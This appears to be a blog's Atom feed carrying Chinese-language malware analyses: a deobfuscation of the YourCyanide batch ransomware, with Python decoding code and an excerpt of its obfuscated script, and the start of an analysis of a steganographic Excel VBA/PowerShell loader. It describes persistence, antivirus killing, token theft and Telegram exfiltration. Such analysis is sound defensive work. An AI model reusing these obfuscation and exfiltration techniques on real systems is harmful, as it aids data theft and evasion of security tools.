<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Demon</title>
  
  <subtitle>Secist</subtitle>
  <link href="https://www.ggsec.cn/atom.xml" rel="self"/>
  
  <link href="https://www.ggsec.cn/"/>
  <updated>2025-04-26T00:15:33.483Z</updated>
  <id>https://www.ggsec.cn/</id>
  
  <author>
    <name>Demon</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>page</title>
    <link href="https://www.ggsec.cn/page.html"/>
    <id>https://www.ggsec.cn/page.html</id>
    <published>2025-04-26T00:15:33.000Z</published>
    <updated>2025-04-26T00:15:33.483Z</updated>
    
    
    
    
    
  </entry>
  
  <entry>
    <title>基于CMD勒索脚本混淆分析</title>
    <link href="https://www.ggsec.cn/YourCyanide_CMD-Based%20Ransomware.html"/>
    <id>https://www.ggsec.cn/YourCyanide_CMD-Based%20Ransomware.html</id>
    <published>2022-08-14T03:07:41.000Z</published>
    <updated>2022-11-25T12:56:16.000Z</updated>
    
    <content type="html"><![CDATA[<p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/hack-like-pro-spy-anyone-part-1-hacking-computers.1280x600.jpg"></p><span id="more"></span><p>在这篇博文中，我们将分析 YourCyanide，它是基于 CMD 的勒索软件系列的最新变体，始于 GonnaCope。YourCyanide 是一种复杂的勒索软件，它集成了 PasteBin、Discord 和 Microsoft 文档链接，作为其payload下载的一部分。YourCyanide 包含多层混淆，并利用自定义环境变量和启用延迟扩展功能来隐藏其活动。作为其规避策略的一部分，YourCyanide 还将通过不同的文件，通过 Discord 和 Pastebin 下载后续文件，然后最终下载主要有效负载。<br>使用vscode打开混淆脚本后，可以看到该代码为批处理脚本，同时为多处混淆内容。<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1660446743553.png" alt="enter description here"><br>这些环境变量，因为这些值周围有两个%的百分比符号，比如%jVElq:<del>20,1%。<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1660446772327.png" alt="enter description here"><br>接下来是设定值，这些基本上是数字值将从其索引并根据值返回字符或字符串的字母，从jVElq设置变量来看。<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1660446794998.png" alt="enter description here"><br>打开cmd窗口，复制粘贴jVElq的变量，然后使用echo再去打印“%jVElq:</del>20,1%”，打印的结果为e。<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1660446811939.png" alt="enter description here"><br>在vscode中按住ctrl+F使用查找并点击下图红框的按钮进行正则匹配“%jVElq:~[0-9]+,[0-9]+%”，可以看到进行模糊匹配关于jVElq环境变量。<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1660446824364.png" alt="enter description here"><br>那么接下来写个脚本进行手工解密，用来理解混淆的思路，在vscode上新建一个文本文档，定义jVElq的字符串的值，定义obfuscation_cmd为YourCyanide.txt的第七行的值，为混淆的代码。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line">jVElq=<span class="string">&quot;yxlpdqajizrusokhbmnwefgctv&quot;</span></span><br><span class="line">obfuscation_cmd =<span class="string">&quot;@%jVElq:~20,1%%jVElq:~23,1%%jVElq:~15,1%%jVElq:~13,1% %jVElq:~13,1%%jVElq:~21,1%%jVElq:~21,1%&quot;</span></span><br><span class="line"><span class="comment">#定义obfuscation_cmd </span></span><br></pre></td></tr></table></figure><p>定义obfuscation_code的值 使用正则匹配 “ %jVElq:<del>[0-9]+,[0-9]+% ” 如obfuscation_cmd的%jVElq:</del>20,1%等，同时将这些值放入新的列表中obfuscation_list。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">obfuscation_list1=[]</span><br><span class="line">obfuscation_code1 = re.finditer(<span class="string">r&quot;%jVElq:~[0-9]+&quot;</span>,obfuscation_cmd) </span><br><span class="line"><span class="keyword">for</span> <span class="keyword">match</span> <span class="keyword">in</span> obfuscation_code1: </span><br><span class="line">    obfuscation_list1.append(<span class="keyword">match</span>.group())</span><br><span class="line"><span class="comment">#定义obfuscation_code1变量 使用正则匹配 “ %jVElq:~[0-9]+ ” 如obfuscation_cmd的%jVElq:~20%等。</span></span><br><span class="line"><span class="built_in">print</span> (obfuscation_list1)</span><br></pre></td></tr></table></figure><p>打印obfuscation_list1如下图红框。<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1660446970337.png" alt="enter description here"><br>接着定义obfuscation_Sequence的值 ，使用正则匹配 jVElq 的序列匹配obfuscation_cmd 的数字，注释上面的obfuscation_list的代码，最后打印Sequence_list的列表。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">obfuscation_Sequence= re.finditer(<span class="string">r&quot;\d+&quot;</span>,<span class="built_in">str</span>(obfuscation_list1)) </span><br><span class="line">Sequence_list=[]</span><br><span class="line"><span class="keyword">for</span> match2 <span class="keyword">in</span> obfuscation_Sequence: </span><br><span class="line">Sequence_list.append(jVElq[<span class="built_in">int</span>(match2.group())])</span><br><span class="line"><span class="built_in">print</span> (Sequence_list)</span><br><span class="line"><span class="comment">#定义obfuscation_Sequence的值 ，使用正则匹配 jVElq 的序列匹配obfuscation_cmd 的数字。</span></span><br></pre></td></tr></table></figure><p>打印出obfuscation_list的列表的值拼接起来就是echo off。<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1660447168756.png" alt="enter description here"><br>再次定义obfuscation_code2变量 使用正则匹配 “ %jVElq:<del>[0-9]+,[0-9]+% ” 如obfuscation_cmd的%jVElq:</del>20,1%等。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">eobfuscation_list2=[]</span><br><span class="line">obfuscation_code2 = re.finditer(<span class="string">r&quot;%jVElq:~[0-9]+,[0-9]+%&quot;</span>,obfuscation_cmd) </span><br><span class="line"><span class="keyword">for</span> <span class="keyword">match</span> <span class="keyword">in</span> obfuscation_code2: </span><br><span class="line">    obfuscation_list2.append(<span class="keyword">match</span>.group())</span><br><span class="line"><span class="comment">#定义obfuscation_code2变量 使用正则匹配 “ %jVElq:~[0-9]+,[0-9]+% ” 如obfuscation_cmd的%jVElq:~20,1%等。</span></span><br></pre></td></tr></table></figure><p>接下来去定义一个字典，将输出的对应的索引值与jVElq的值进行做成一个字典，注释掉上一个“print (Sequence_list)”，最后打印字典。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">dic=&#123;&#125;</span><br><span class="line"><span class="comment">#dic 给一个空的字典</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(obfuscation_list2)):</span><br><span class="line">    dic_old = &#123;obfuscation_list2[i]:Sequence_list[i]&#125;</span><br><span class="line">    <span class="comment">#定义dic_old 添加&#123;obfuscation_list2：Sequence_list &#125;成为字典</span></span><br><span class="line">    dic.update(dic_old)</span><br><span class="line"><span class="built_in">print</span> (dic)</span><br></pre></td></tr></table></figure><p>打印出相对应的字典，同时可以看到去掉了一些重复的字符内容，如下图红框中的内容。<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1660447333786.png" alt="enter description here"><br>最后进行将dic字典对应的字母与混淆的代码替换，然后重组打印，同样也是注释上面的“print (dic)”。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> key <span class="keyword">in</span> dic:</span><br><span class="line">    obfuscation_cmd = obfuscation_cmd.replace(key,dic[key])</span><br><span class="line"><span class="built_in">print</span>(obfuscation_cmd)</span><br><span class="line"><span class="comment">#将dic 字典对应的字母与混淆的代码替换，重组打印。</span></span><br></pre></td></tr></table></figure><p>可以看到这组对应的混淆代码经过手工解码后为字符串是“@echo off”。<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1660447390971.png" alt="enter description here"></p><p>完整代码如下所示：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line">jVElq=<span class="string">&quot;yxlpdqajizrusokhbmnwefgctv&quot;</span></span><br><span class="line">obfuscation_cmd =<span class="string">&quot;@%jVElq:~20,1%%jVElq:~23,1%%jVElq:~15,1%%jVElq:~13,1% %jVElq:~13,1%%jVElq:~21,1%%jVElq:~21,1%&quot;</span></span><br><span class="line"><span class="comment">#定义obfuscation_cmd变量 </span></span><br><span class="line"></span><br><span class="line">obfuscation_list1=[]</span><br><span class="line">obfuscation_code1 = re.finditer(<span class="string">r&quot;%jVElq:~[0-9]+&quot;</span>,obfuscation_cmd) </span><br><span class="line"><span class="keyword">for</span> <span class="keyword">match</span> <span class="keyword">in</span> obfuscation_code1: </span><br><span class="line">    obfuscation_list1.append(<span class="keyword">match</span>.group())</span><br><span class="line"><span class="comment">#定义obfuscation_code1变量 使用正则匹配 “ %jVElq:~[0-9]+ ” 如obfuscation_cmd的%jVElq:~20%等。</span></span><br><span class="line"><span class="comment">#print (obfuscation_list1)</span></span><br><span class="line">obfuscation_Sequence= re.finditer(<span class="string">r&quot;\d+&quot;</span>,<span class="built_in">str</span>(obfuscation_list1)) </span><br><span class="line"></span><br><span class="line">Sequence_list=[]</span><br><span class="line"><span class="keyword">for</span> match2 <span class="keyword">in</span> obfuscation_Sequence: </span><br><span class="line">    Sequence_list.append(jVElq[<span class="built_in">int</span>(match2.group())])</span><br><span class="line"><span class="comment">#print (Sequence_list)</span></span><br><span class="line"><span class="comment">#定义obfuscation_Sequence变量 ，使用正则匹配 jVElq 的序列匹配obfuscation_cmd 的数字。</span></span><br><span class="line"></span><br><span class="line">obfuscation_list2=[]</span><br><span class="line">obfuscation_code2 = re.finditer(<span class="string">r&quot;%jVElq:~[0-9]+,[0-9]+%&quot;</span>,obfuscation_cmd) </span><br><span class="line"><span class="keyword">for</span> <span class="keyword">match</span> <span class="keyword">in</span> obfuscation_code2: </span><br><span class="line">    obfuscation_list2.append(<span class="keyword">match</span>.group())</span><br><span class="line"><span class="comment">#定义obfuscation_code2变量 使用正则匹配 “ %jVElq:~[0-9]+,[0-9]+% ” 如obfuscation_cmd的%jVElq:~20,1%等。</span></span><br><span class="line"></span><br><span class="line">dic=&#123;&#125;</span><br><span class="line"><span class="comment">#dic 给一个空的字典</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(obfuscation_list2)):</span><br><span class="line">    dic_old = &#123;obfuscation_list2[i]:Sequence_list[i]&#125;</span><br><span class="line">    <span class="comment">#定义dic_old 添加&#123;obfuscation_list2：Sequence_list &#125;成为字典</span></span><br><span class="line">    dic.update(dic_old)</span><br><span class="line"><span class="comment">#print (dic)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> key <span class="keyword">in</span> dic:</span><br><span class="line">    obfuscation_cmd = obfuscation_cmd.replace(key,dic[key])</span><br><span class="line"><span class="built_in">print</span>(obfuscation_cmd)</span><br><span class="line"><span class="comment">#将dic 字典对应的字母与混淆的代码替换，重组打印。</span></span><br></pre></td></tr></table></figure><p>那么重新复制YourCyanide.txt的下图红框的内容，<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1660447468801.png" alt="enter description here"><br>粘贴并替换到python代码中obfuscation_cmd 的值。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">obfuscation_cmd =<span class="string">&quot;&quot;&quot;@%jVElq:~20,1%%jVElq:~23,1%%jVElq:~15,1%%jVElq:~13,1% %jVElq:~13,1%%jVElq:~21,1%%jVElq:~21,1%</span></span><br><span class="line"><span class="string">%jVElq:~23,1%%jVElq:~2,1%%jVElq:~12,1%</span></span><br><span class="line"><span class="string">%jVElq:~12,1%%jVElq:~20,1%%jVElq:~24,1%%jVElq:~2,1%%jVElq:~13,1%%jVElq:~23,1%%jVElq:~6,1%%jVElq:~2,1% %jVElq:~20,1%%jVElq:~18,1%%jVElq:~6,1%%jVElq:~16,1%%jVElq:~2,1%%jVElq:~20,1%%jVElq:~20,1%%jVElq:~1,1%%jVElq:~24,1%%jVElq:~20,1%%jVElq:~18,1%%jVElq:~12,1%%jVElq:~8,1%%jVElq:~13,1%%jVElq:~18,1%%jVElq:~12,1% &amp;&amp; %jVElq:~12,1%%jVElq:~20,1%%jVElq:~24,1%%jVElq:~2,1%%jVElq:~13,1%%jVElq:~23,1%%jVElq:~6,1%%jVElq:~2,1% %jVElq:~20,1%%jVElq:~18,1%%jVElq:~6,1%%jVElq:~16,1%%jVElq:~2,1%%jVElq:~20,1%%jVElq:~4,1%%jVElq:~20,1%%jVElq:~2,1%%jVElq:~6,1%%jVElq:~0,1%%jVElq:~20,1%%jVElq:~4,1%%jVElq:~20,1%%jVElq:~1,1%%jVElq:~3,1%%jVElq:~6,1%%jVElq:~18,1%%jVElq:~12,1%%jVElq:~8,1%%jVElq:~13,1%%jVElq:~18,1%</span></span><br><span class="line"><span class="string">%jVElq:~12,1%%jVElq:~20,1%%jVElq:~24,1% %JSCUL:~23,1%%jVElq:~6,1%%JSCUL:~6,1%%jVElq:~1,1%%JSCUL:~0,1%=%ozMXz:~4,1%%ozMXz:~0,1%%ozMXz:~7,1%%ozMXz:~6,1%%ozMXz:~5,1%%ozMXz:~9,1%%ozMXz:~2,1%%ozMXz:~1,1%%ozMXz:~3,1%%ozMXz:~8,1%</span></span><br><span class="line"><span class="string">%jVElq:~12,1%%jVElq:~20,1%%jVElq:~24,1% %JSCUL:~20,1%%JSCUL:~6,1%%JSCUL:~17,1%%JSCUL:~25,1%%JSCUL:~19,1%=%JSCUL:~0,1%%JSCUL:~17,1%%JSCUL:~2,1%%JSCUL:~11,1%%JSCUL:~8,1%%JSCUL:~3,1%%JSCUL:~12,1%%JSCUL:~4,1%%JSCUL:~16,1%%JSCUL:~10,1%%JSCUL:~23,1%%JSCUL:~21,1%%JSCUL:~25,1%%JSCUL:~19,1%%JSCUL:~24,1%%JSCUL:~15,1%%JSCUL:~18,1%%JSCUL:~7,1%%JSCUL:~9,1%%JSCUL:~1,1%%JSCUL:~6,1%%JSCUL:~20,1%%JSCUL:~5,1%%JSCUL:~14,1%%JSCUL:~13,1%%JSCUL:~22,1%</span></span><br><span class="line"><span class="string">%jVElq:~12,1%%jVElq:~20,1%%jVElq:~24,1% %jVElq:~1,1%%jVElq:~11,1%%jVElq:~11,1%%jVElq:~18,1%%JSCUL:~3,1%=%jVElq:~24,1%%jVElq:~22,1%%jVElq:~9,1%%jVElq:~11,1%%jVElq:~15,1%%jVElq:~5,1%%jVElq:~23,1%%jVElq:~21,1%%jVElq:~3,1%%jVElq:~4,1%%jVElq:~25,1%%jVElq:~2,1%%jVElq:~13,1%%jVElq:~19,1%%jVElq:~0,1%%jVElq:~10,1%%jVElq:~20,1%%jVElq:~14,1%%jVElq:~16,1%%jVElq:~7,1%%jVElq:~1,1%%jVElq:~17,1%%jVElq:~18,1%%jVElq:~8,1%%jVElq:~6,1%%jVElq:~12,1%</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure><p>最后打印改混淆前的代码，可以看到打印出的代码依稀可见一部分可读的字符串，同时还有一些混淆代码在里面，也就是刚刚解的是这组混淆的第一层代码。<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1660447534499.png" alt="enter description here"><br>接下来使用工具一层层的解除混淆，打开【DecodeEnvType_4.exe】,点击右上角的clear按钮。<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1660447546687.png" alt="enter description here"><br>复制全部【YourCyanide.txt】代码的内容，粘贴到【DecodeEnvType_4.exe】，同时填写设定值jVElq及字符串如下图所示。<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1660447577603.png" alt="enter description here"><br>点击Decode按钮，输出第一组的第一层的解码内容。<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1660447588340.png" alt="enter description here"><br>接着解码第一组的第二层，重新填写设定值JSCUL及字符串如下图所示。<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1660447603346.png" alt="enter description here"><br>如遇到快捷键无法全选，则在input或者output，右键全选。<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1660447621242.png" alt="enter description here"></p><p>接着解码第一组的第三层，重新填写设定值ozMXz及字符串如下图所示。<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1660447677972.png" alt="enter description here"><br>接着用第一组的密钥，解码第二组的混淆，依次类推，解完后如下。<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1660447749140.png" alt="enter description here"><br>首先可以看到执行后，YourCyanide 将其文件属性设置为隐藏和系统文件，然后启动五个最大化的命令提示符窗口。<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1660447780357.png" alt="enter description here"><br>然后它将尝试使用 net localgroup 命令将用户“session”添加到管理员组。<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1660447788063.png" alt="enter description here"><br>它还通过在 HKLM\Software\Microsoft\Windows\CurrentVersion\Run 中创建注册表项，然后将自身复制到 Startup 目录来创建持久性的自动启动机制。它还通过修改其注册表项来禁用任务管理器。<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1660447797471.png" alt="enter description here"><br>然后它检查 %SystemDrive%\AutoExec.bat 是否存在，如果存在，它会删除原始文件，然后复制自身并将文件设置为只读、隐藏并作为系统文件。<br>它还避免了具有以下用户名的机器，根据我们的研究，其中一些是恶意软件研究人员和沙盒系统使用的用户名，这意味着恶意软件作者正在注意哪些机器应该被规避，如下图所示<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1660447820798.png" alt="enter description here"><br>检查受感染机器的用户名后，它会在“UserProfile\Documents\black.bat” 中删除并执行一个批处理文件。此批处理文件负责不断打开空白屏幕保护程序文件，这会在恶意软件运行时使机器无法访问。<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1660447832953.png" alt="enter description here"><br>YourCyanide 还通过连接变量以形成字符串“net stop”、“norton”、“symantec”和“McAfee”来终止多个服务和安全应用程序。<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1660447842002.png" alt="enter description here"><br>以及还下载KillAVS脚本。<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1660447851529.png" alt="enter description here"><br>打开找到killAVS.bat，打开后发现依旧是混淆，不过这个脚本混淆和前面部分不一样，只需挨个替换即可。<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1660447898017.png" alt="enter description here"><br>如找到%ii%，与上面”set ii&#x3D;ne”对应，然后在vscode按住ctrl+F，替换全部即可。<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1660447906426.png" alt="enter description here"></p><p>全部替换如下图所示，终止多个服务和安全应用程序：<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1660447918750.png" alt="enter description here"><br>然后它使用 user32.dll 文件的 SwapMouseButton Export 函数交换鼠标按钮。<br>终止应用程序后，它将以下目录中的文件重命名为<random number>*<random number>.cyn，并使用 CMD shell 中名为 %random% 的内置变量将其内容覆盖为随机数。<br>尽管没有执行实际的加密，但由于文件被重命名，用户仍然会感到非常不便——尤其是对于那些在这些特定文件夹中有大量文件的人。此外，由于恶意软件目前仍在开发中，恶意软件作者很可能仍在完成例程的加密部分。<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1660447934821.png" alt="enter description here"><br>然后它会创建以下赎金记录并将它们放入 %MyDesktop%。<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1660447945101.png" alt="enter description here"><br>它具有两个实例，其中将自身复制到批处理文件，然后将恶意代码附加到win.ini和 system.ini。<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1660447954735.png" alt="enter description here"><br>在执行其例程后，它会删除 %MyDocuments% 目录中的 black.bat 文件，该文件负责使机器无法访问。删除文件将阻止空白屏幕保护程序文件持续打开。<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1660447964689.png" alt="enter description here"><br>YourCyanide 还能够通过电子邮件和不同的驱动器进行传播。它创建了两个 VBScript 文件 mail.vbs 和 loveletter.vbs，它们使用以下主题发送电子邮件（其本身作为附件）。<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1660447983467.png" alt="enter description here"><br>绕过远程桌面连接和防火墙，YourCyanide 使用下图中所示的 netsh 命令启用远程桌面连接 (RDP)。<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1660447993737.png" alt="enter description here"><br>然后它将 YourCyanide.cmd 转储到新创建的目录中。该文件的内容如下图所示。Dropper执行批处理脚本以从 Pastebin 获取内容并将其保存为 YourCyanide.cmd，这是用批处理脚本编写的实际勒索软件。<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1660448016269.png" alt="enter description here"><br>打开ycynlog.bat，可以看到依旧是混淆，同样使用工具解码，这次只有一组。<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1660448026081.png" alt="enter description here"><br>解到将output的内容，全选复制，并在vscode新建文本粘贴解码内容保存为decode_ycnlog.txt。<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1660448049262.png" alt="enter description here"><br>ycynlog.cmd文件负责从受感染的机器中收集和泄露被盗信息。与主文件一样，它也具有多层混淆功能。执行后，文件会隐藏自身并通过在HKLM\Software\Microsoft\Windows\CurrentVersion\Run 中生成注册表项并将自身复制到 Startup 目录来创建其自动启动机制。<br>该恶意软件使用 Telegram聊天机器人API泄露被盗信息并将其设置为变量“Webhook”。<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1660448061971.png" alt="enter description here"><br>它从Discord (GetToken.exe)下载另一个可执行文件。运行此可执行文件会创建文件 MyTokens.txt，其中包含来自不同应用程序（如 Chrome、Discord 和 Microsoft Edge）的被盗访问令牌数据。<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1660448075792.png" alt="enter description here"><br>将GetToken.bin拖入peid工具中，可以发现是32位的C#程序。<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1660448117996.png" alt="enter description here"><br>关闭PEID程序，将GetToken.bin拖入dnspy反编译工具，点击下图红框中的main函数。<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1660448163459.png" alt="enter description here"><br>GetToken 是一个 C#的NET 程序，用于窃取用户的 Discord 令牌。窃取程序包含 Discord 的硬编码目录路径和各种 Web 浏览器的本地存储，如下图所示。<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1660448176796.png" alt="enter description here"><br>令牌通过使用正则表达式模式匹配来识别，如下所示。如果找到匹配项，窃取者通过调用函数 TokenUtil.checkToken 来检查令牌的有效性。<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1660448186025.png" alt="enter description here"><br>令牌有效性是通过连接到Discord服务器并监控服务器响应来执行的。令牌检查例程如下所示。有效令牌返回给调用者函数。<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1660448194831.png" alt="enter description here"><br>窃取者在受害者系统上创建一个文件 Tokens.txt 并转储找到的所有有效令牌。如果不存在令牌，写入 Tokens.txt 的值为“Retard Has No tokens”。勒索软件最终将 Token.txt发送到Telegram机器人。<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1660448207204.png" alt="enter description here"><br>Tokens.txt 和 userdata.txt 都将使用 curl 命令通过 Telegram 聊天机器人 API 发送。还发现 YourCyanide 泄露了与 Minecraft相关的凭据。<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1660448215657.png" alt="enter description here"><br>分析中，我们可以推断出恶意软件作者正在积极监控恶意软件研究人员创建的报告，方法是记录在沙箱日志和报告中发现的用户名，并将它们包括在用户名和具有多种功能的勒索软件变体（例如本博文中分析的变体）正越来越受欢迎。虽然 YourCyanide 及其其他变体目前的影响力不如其他系列，但它代表了对勒索软件工具包的一次有趣更新，将蠕虫、勒索软件和信息窃取程序捆绑到单个中间层勒索软件框架中。<br>这些勒索软件变种也很可能处于开发阶段，因此在它们进一步发展并造成更大破坏之前，优先检测和阻止它们。</p><p>参考链接：<a href="https://pcsxcetrasupport3.wordpress.com/2022/05/16/pealing-back-the-layers-of-a-batch-script-ransomware/">https://pcsxcetrasupport3.wordpress.com/2022/05/16/pealing-back-the-layers-of-a-batch-script-ransomware/</a></p><hr>]]></content>
    
    
    <summary type="html">&lt;p&gt;&lt;img src=&quot;https://demonsec666.oss-cn-qingdao.aliyuncs.com/hack-like-pro-spy-anyone-part-1-hacking-computers.1280x600.jpg&quot;&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="windows" scheme="https://www.ggsec.cn/categories/windows/"/>
    
    <category term="恶意样本分析" scheme="https://www.ggsec.cn/categories/%E6%81%B6%E6%84%8F%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/"/>
    
    
    <category term="Windows" scheme="https://www.ggsec.cn/tags/Windows/"/>
    
    <category term="恶意样本分析" scheme="https://www.ggsec.cn/tags/%E6%81%B6%E6%84%8F%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
  <entry>
    <title>obfuscation_from_Excel_VBA_Part2</title>
    <link href="https://www.ggsec.cn/obfuscation_from_Excel_VBA_2.html"/>
    <id>https://www.ggsec.cn/obfuscation_from_Excel_VBA_2.html</id>
    <published>2022-01-07T10:36:38.000Z</published>
    <updated>2022-11-25T12:52:58.000Z</updated>
    
    <content type="html"><![CDATA[<p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/python-bundle-can-teach-you-everything-you-need-know.1280x600.jpg"></p><span id="more"></span><p>继续分析 4 个要下载的文件的列表。</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1641478328293.png"></p><p>下载到本地继续分析。</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/image-20220107143634772.png" alt="image-20220107143634772"></p><p>下载文件后，它将使用该函数提取每个像素以及 B 和 G 颜色值，进行数学运算然后作为字符输出。<br>之后，它将传递从像素解码的 base64 字符串和 ([System.Version]).”nAME” 的结果，其计算结果为“Version”。该值用作解密中的密钥。<br>解密函数将使用派生密钥函数中 base64 编码数据的前 32 个字节。它还将使用传递的键值。HMAC 部分并不是真正需要正确解密数据。然后我们使用 RijndaelManaged 解密。<br>如果数据被正确解密，我们就会得到第一个字节 0x1F。这也告诉我们，无需查看其余代码，这就是 GZip 压缩数据输出。<br>虽然仍在解密函数中，但它会在返回另一个 base64 字符串之前对数据进行 GZip 解压缩。</p><p>更改脚本，更改为本地地址搭建个http服务端，再接着删除<code>&amp;(&quot;&#123;1&#125;&#123;0&#125;&quot; -f &#39;X&#39;,&#39;IE&#39;)</code>字符，因该函数为iex执行，删除后就可以直接输出结果。</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/image-20220107144454881.png" alt="image-20220107144454881"></p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/image-20220107144642478.png" alt="image-20220107144642478"></p><p>输出内容。</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/image-20220107144752315.png" alt="image-20220107144752315"></p><p>看到$Fghg将被设置为一个值，需要 LCID，而文档为日语。则需找到日语的LCID即可</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/image-20220107145249283.png" alt="image-20220107145249283"></p><p>而LCID为1041</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/image-20220107145224776.png" alt="image-20220107145224776"></p><p>第一个值为408</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/image-20220107145525413.png" alt="image-20220107145525413"></p><p>则更改脚本如下，并去掉iex输出变量okkiis的值即可</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/image-20220107145606479.png" alt="image-20220107145606479"></p><p>同时再增加前面脚本的func OtTAsS和func bAvV</p><p><img 